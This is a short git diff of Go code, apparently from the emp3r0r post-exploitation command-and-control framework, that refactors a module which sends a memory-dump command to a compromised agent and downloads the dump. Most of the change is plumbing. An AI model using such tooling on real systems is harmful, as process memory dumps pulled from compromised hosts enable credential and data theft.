@@ -7,20 +7,21 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
+	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
 
-func moduleMemDump() {
-	pidOpt, ok := live.ActiveModule.Options["pid"]
+func moduleMemDump(ctx *c2context.C2Context) {
+	pidOpt, ok := ctx.Flags["pid"]
 	if !ok {
 		logging.Errorf("Option 'pid' not found")
 		return
 	}
-	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdMemDump, pidOpt.Val)
+	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdMemDump, pidOpt)
 	cmd_id := uuid.NewString()
-	err := CmdSender(cmd, cmd_id, live.ActiveAgent.Tag)
+	err := CmdSender(cmd, cmd_id, ctx.Target.Tag)
 	if err != nil {
 		logging.Errorf("SendCmd: %v", err)
 		return
@@ -44,7 +45,7 @@ func moduleMemDump() {
 		return
 	}
 
-	_, err = ftp.GetFile(path, live.ActiveAgent)
+	_, err = ftp.GetFile(path, ctx.Target)
 	if err != nil {
 		logging.Errorf("GetFile: %v", err)
 		return
